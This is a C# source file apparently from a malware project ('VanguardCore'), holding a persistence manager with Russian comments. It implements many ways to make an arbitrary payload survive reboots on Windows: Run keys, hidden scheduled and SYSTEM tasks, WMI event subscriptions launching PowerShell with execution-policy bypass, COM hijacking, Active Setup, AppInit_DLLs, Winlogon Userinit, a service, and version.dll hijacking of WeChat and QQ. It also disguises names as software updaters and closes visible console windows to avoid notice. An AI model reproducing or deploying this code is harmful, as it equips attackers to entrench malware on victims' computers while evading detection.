using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;

namespace VanguardCore
{
    /// <summary>
    /// Менеджер персистенции — 9 методов закрепления без прав администратора
    /// </summary>
    public class PersistManager
    {
        #region Константы
        private const int SW_HIDE = 0;
        private const uint WM_CLOSE = 0x0010;
        private const int HANDLE_FLAG_INHERIT = 0x00000001;
        #endregion

        #region Структуры
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }
        #endregion

/*
        #region COM Interfaces (ShellLink)
        [ComImport, Guid("00021401-0000-0000-C000-000000000046")]
        internal class ShellLink { }

        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown), Guid("000214EE-0000-0000-C000-000000000046")]
        internal interface IShellLink
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown), Guid("0000010b-0000-0000-C000-000000000046")]
        internal interface IPersistFile
        {
            void GetClassID(out Guid pClassID);
            void IsDirty();
            void Load([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, int dwMode);
            void Save([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, [MarshalAs(UnmanagedType.Bool)] bool fRemember);
            void SaveCompleted([MarshalAs(UnmanagedType.LPWStr)] string pszFileName);
            void GetCurFile([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder ppszFileName);
        }
        #endregion
*/

        #region Native Imports
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("kernel32.dll")]
        private static extern uint GetTickCount();

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        #endregion

        #region Проверки
        public static bool IsAdmin()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch { return false; }
        }
        #endregion

        #region Вспомогательные методы
        private static string GenerateRandomName()
        {
            string[] legit = {
                "WindowsUpdate", "OneDriveUpdate", "AdobeUpdater",
                "GoogleUpdate", "MicrosoftEdgeUpdate", "IntelDriverUpdate",
                "NVidiaUpdate", "AppleUpdate", "JavaUpdate",
                "SpotifyUpdate", "TeamsUpdate", "ZoomUpdate",
                "ChromeUpdate", "FirefoxUpdate", "OperaUpdate",
                "DropboxUpdate", "DiscordUpdate", "SlackUpdate",
                "VSCodeUpdate", "GitUpdate", "PythonUpdate",
                "DriverUpdate", "SecurityUpdate", "DefenderUpdate"
            };
            return legit[new Random().Next(legit.Length)] +
                   new Random().Next(1000, 9999).ToString();
        }

        private static void HideWindow(IntPtr hWnd)
        {
            try
            {
                uint pid;
                GetWindowThreadProcessId(hWnd, out pid);
                if (pid == Process.GetCurrentProcess().Id) return;

                StringBuilder title = new StringBuilder(256);
                GetWindowText(hWnd, title, title.Capacity);

                if (IsWindowVisible(hWnd) &&
                    (title.ToString().Contains("cmd") ||
                     title.ToString().Contains("powershell") ||
                     title.ToString().Contains("Console") ||
                     title.ToString().Contains("schtasks") ||
                     title.ToString().Contains("wmic")))
                {
                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                }
            }
            catch { }
        }

        private static bool EnumWindowCallback(IntPtr hWnd, IntPtr lParam)
        {
            HideWindow(hWnd);
            return true;
        }

        private static void HideAllConsoleWindows()
        {
            try
            {
                EnumWindows(EnumWindowCallback, IntPtr.Zero);
            }
            catch { }
        }

        private static void RunHidden(string fileName, string arguments)
        {
            try
            {
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                si.cb = (uint)Marshal.SizeOf(si);
                si.dwFlags = 0x00000100; // STARTF_USESTDHANDLES
                si.wShowWindow = 0; // SW_HIDE

                if (CreateProcess(null,
                    string.Format("\"{0}\" {1}", fileName, arguments),
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0x08000000, // CREATE_NO_WINDOW (Removed SUSPENDED as it prevented execution)
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi))
                {
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                }
            }
            catch { }
        }

        private static bool IsUserIdle()
        {
            try
            {
                LASTINPUTINFO lastInPut = new LASTINPUTINFO();
                lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
                if (GetLastInputInfo(ref lastInPut))
                {
                    uint idleTime = GetTickCount() - lastInPut.dwTime;
                    return idleTime > 300000; // 5 минут бездействия
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 1: Реестр (HKCU/HKLM) — Базовый
        public static bool InstallRegistryRun(string name, string path, bool hklm = false)
        {
            try
            {
                RegistryKey baseKey = hklm ? Registry.LocalMachine : Registry.CurrentUser;
                using (RegistryKey k = baseKey.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (k != null)
                    {
                        k.SetValue(name, "\"" + path + "\"");
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 2: Папка автозагрузки (Startup)
        public static bool InstallStartupFolder(string name, string targetPath)
        {
            // Disabled for NativeAOT compatibility (COM ShellLink issue)
            return false;
        }
        #endregion

        #region Метод 3: Планировщик задач (User/SYSTEM)
        public static bool InstallTask(string name, string path, bool admin = false)
        {
            try
            {
                string cmd;
                if (admin)
                {
                    // SYSTEM level task, runs at system startup (not just logon)
                    cmd = string.Format("/c schtasks /create /tn \"{0}\" /tr \"\\\"{1}\\\"\" /sc onstart /ru SYSTEM /rl HIGHEST /f", name, path);
                }
                else
                {
                    // User level task, runs at logon
                    cmd = string.Format("/c schtasks /create /tn \"{0}\" /tr \"\\\"{1}\\\"\" /sc onlogon /ru \"{2}\" /f /it", name, path, Environment.UserName);
                }
                
                RunHidden("cmd.exe", cmd);
                Thread.Sleep(500);
                HideAllConsoleWindows();

                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Метод 4: WMI Event (User) — ОЧЕНЬ СКРЫТНО
        public static bool InstallWMIEvent(string path)
        {
            try
            {
                string query = @"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'";
                string action = string.Format("powershell -w hidden -ep bypass -c \"& '{0}'\"", path);

                string cmd = string.Format(@"
                    $filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();
                    $filter.QueryLanguage = 'WQL';
                    $filter.Query = '{0}';
                    $filter.Name = '{1}';
                    $filter.EventNamespace = 'root\cimv2';
                    $filter.Put() | Out-Null;

                    $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();
                    $consumer.Name = '{2}';
                    $consumer.CommandLineTemplate = '{3}';
                    $consumer.Put() | Out-Null;

                    $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();
                    $binding.Filter = $filter.Path.RelPath;
                    $binding.Consumer = $consumer.Path.RelPath;
                    $binding.Put() | Out-Null;
                ", query, GenerateRandomName(), GenerateRandomName(), action);

                RunHidden("powershell.exe", string.Format("-w hidden -command \"{0}\"", cmd));
                Thread.Sleep(500);
                HideAllConsoleWindows();

                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Метод 5: COM Hijacking (HKCU) — ЭКСТРЕМАЛЬНО СКРЫТНО
        public static bool InstallCOMHijack(string path)
        {
            try
            {
                // Генерируем случайный CLSID
                string clsid = Guid.NewGuid().ToString("B").ToUpper();

                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(
                    string.Format("Software\\Classes\\CLSID\\{0}\\InprocServer32", clsid)))
                {
                    if (k != null)
                    {
                        k.SetValue("", path);
                        k.SetValue("ThreadingModel", "Both");
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 6: Политики Explorer (HKCU/HKLM)
        public static bool InstallExplorerPolicy(string path, bool hklm = false)
        {
            try
            {
                RegistryKey baseKey = hklm ? Registry.LocalMachine : Registry.CurrentUser;
                using (RegistryKey k = baseKey.CreateSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"))
                {
                    if (k != null)
                    {
                        string name = GenerateRandomName();
                        k.SetValue(name, path);
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 7: Active Setup (HKCU/HKLM)
        public static bool InstallActiveSetup(string path, bool hklm = false)
        {
            try
            {
                string stubPath = string.Format("\"{0}\"", path);
                string clsid = Guid.NewGuid().ToString("B");
                RegistryKey baseKey = hklm ? Registry.LocalMachine : Registry.CurrentUser;

                using (RegistryKey k = baseKey.CreateSubKey(
                    string.Format("Software\\Microsoft\\Active Setup\\Installed Components\\{0}", clsid)))
                {
                    if (k != null)
                    {
                        k.SetValue("", "Update");
                        k.SetValue("StubPath", stubPath);
                        k.SetValue("Version", "1,0,0,1");
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 8: AppInit_DLLs (HKCU) — для DLL
        public static bool InstallAppInitDLL(string dllPath)
        {
            try
            {
                if (!File.Exists(dllPath) || !dllPath.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    return false;

                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(
                    "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"))
                {
                    if (k != null)
                    {
                        string val = k.GetValue("AppInit_DLLs", "") as string;
                        string current = val != null ? val : "";
                        if (!current.Contains(dllPath))
                        {
                            k.SetValue("AppInit_DLLs", current + ";" + dllPath);
                            k.SetValue("LoadAppInit_DLLs", 1, RegistryValueKind.DWord);
                        }
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 9: UserInitMprLogonScript
        public static bool InstallLogonScript(string path)
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(
                    "Environment"))
                {
                    if (k != null)
                    {
                        k.SetValue("UserInitMprLogonScript", path);
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 11: Windows Service (ADMIN REQUIRED)
        public static bool InstallService(string serviceName, string path)
        {
            if (!IsAdmin()) return false;
            try
            {
                // Create service using sc.exe
                string cmd = string.Format("/c sc create \"{0}\" binPath= \"{1}\" start= auto obj= LocalSystem", serviceName, path);
                RunHidden("cmd.exe", cmd);
                
                Thread.Sleep(500);
                
                // Start service
                RunHidden("cmd.exe", string.Format("/c sc start \"{0}\"", serviceName));
                
                HideAllConsoleWindows();
                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Метод 12: Winlogon Userinit (ADMIN REQUIRED)
        public static bool InstallUserinit(string path)
        {
            if (!IsAdmin()) return false;
            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    if (k != null)
                    {
                        object val = k.GetValue("Userinit");
                        string current = val != null ? val.ToString() : null;
                        if (!string.IsNullOrEmpty(current) && !current.ToLower().Contains(path.ToLower()))
                        {
                            // Userinit is comma-separated list of executables
                            k.SetValue("Userinit", current.TrimEnd(',') + "," + path + ",");
                            return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Метод 10: DLL Hijacking (WeChat/QQ) — ТЕХНИКА ДЛЯ КИТАЙСКОГО РЫНКА
        public static bool InstallDLLHijack(string payloadDllPath)
        {
            try
            {
                if (!File.Exists(payloadDllPath)) return false;

                // 1. WeChat Hijack (version.dll)
                string wechatPath = GetAppInstallPath(@"Software\Tencent\WeChat", "InstallPath");
                if (!string.IsNullOrEmpty(wechatPath) && Directory.Exists(wechatPath))
                {
                    string target = Path.Combine(wechatPath, "version.dll");
                    if (!File.Exists(target))
                    {
                        File.Copy(payloadDllPath, target, true);
                        File.SetAttributes(target, FileAttributes.Hidden | FileAttributes.System);
                    }
                }

                // 2. QQ Hijack (version.dll)
                string qqPath = GetAppInstallPath(@"Software\Tencent\QQ", "InstallPath");
                if (string.IsNullOrEmpty(qqPath))
                    qqPath = GetAppInstallPath(@"Software\Tencent\QQPCMgr", "InstallPath");

                if (!string.IsNullOrEmpty(qqPath) && Directory.Exists(qqPath))
                {
                    // Обычно ищет в папке Bin
                    string binPath = Path.Combine(qqPath, "Bin");
                    if (Directory.Exists(binPath))
                    {
                        string target = Path.Combine(binPath, "version.dll");
                        if (!File.Exists(target))
                        {
                            File.Copy(payloadDllPath, target, true);
                            File.SetAttributes(target, FileAttributes.Hidden | FileAttributes.System);
                        }
                    }
                }

                return true;
            }
            catch { return false; }
        }

        private static string GetAppInstallPath(string keyPath, string valueName)
        {
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(keyPath))
                {
                    if (k != null) return k.GetValue(valueName) as string;
                }
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(keyPath))
                {
                    if (k != null) return k.GetValue(valueName) as string;
                }
            }
            catch { }
            return null;
        }
        #endregion

        #region Установка всех методов
        public static void InstallAll(string path)
        {
            string name = GenerateRandomName();
            bool isAdmin = IsAdmin();

            // Core persistence (HKCU/User)
            InstallRegistryRun(name, path, false);
            InstallStartupFolder(name, path);
            InstallTask(name, path, false);
            InstallExplorerPolicy(path, false);
            InstallActiveSetup(path, false);
            InstallLogonScript(path);
            InstallWMIEvent(path);
            InstallCOMHijack(path);

            // Admin persistence
            if (isAdmin)
            {
                InstallRegistryRun(name, path, true); // HKLM
                InstallTask(name + "Svc", path, true); // Admin Task (SYSTEM)
                InstallService(name, path); // Windows Service
                InstallUserinit(path); // Winlogon Userinit
                InstallExplorerPolicy(path, true); // HKLM Policy
                InstallActiveSetup(path, true); // HKLM Active Setup
            }

            if (path.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                InstallAppInitDLL(path);
                InstallDLLHijack(path);
            }
        }
        #endregion

        #region Удаление всех следов
        public static void RemoveAll(string name = null)
        {
            if (string.IsNullOrEmpty(name))
                name = GenerateRandomName();

            try
            {
                // Registry Run
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (k != null) k.DeleteValue(name, false);
                }

                // Explorer Policies
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true))
                {
                    if (k != null) k.DeleteValue(name, false);
                }

                // Environment (Logon Script)
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey("Environment", true))
                {
                    if (k != null) k.DeleteValue("UserInitMprLogonScript", false);
                }

                // Active Setup
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Active Setup\\Installed Components", true))
                {
                    if (k != null)
                    {
                        foreach (string subKey in k.GetSubKeyNames())
                        {
                            try { k.DeleteSubKeyTree(subKey); } catch { }
                        }
                    }
                }

                // Shortcut
                string startup = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    name + ".lnk");
                if (File.Exists(startup)) File.Delete(startup);

                // Task Scheduler
                RunHidden("schtasks", string.Format("/delete /tn \"{0}\" /f", name));

                // WMI
                string wmiCmd = string.Format(@"
                    Get-WmiObject -Namespace root\subscription -Class __EventFilter |
                        Where-Object {{ $_.Name -like '{0}*' }} | Remove-WmiObject;
                ", name);
                RunHidden("powershell.exe", string.Format("-w hidden -command \"{0}\"", wmiCmd));

                Thread.Sleep(500);
                HideAllConsoleWindows();
            }
            catch { }
        }
        #endregion

        #region Проверка наличия персистенции
        public static bool CheckExists(string name)
        {
            try
            {
                // Registry Run
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (k != null && k.GetValue(name) != null) return true;
                }

                // Startup folder
                string startup = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    name + ".lnk");
                if (File.Exists(startup)) return true;

                // Task Scheduler
                var psi = new ProcessStartInfo("schtasks", string.Format("/query /tn \"{0}\"", name))
                {
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                };
                using (var p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    p.WaitForExit(1000);
                    if (output.Contains(name)) return true;
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Ожидание и скрытие
        public static void WaitAndHide(int milliseconds)
        {
            Thread.Sleep(milliseconds);
            HideAllConsoleWindows();
        }
        #endregion
    }
}
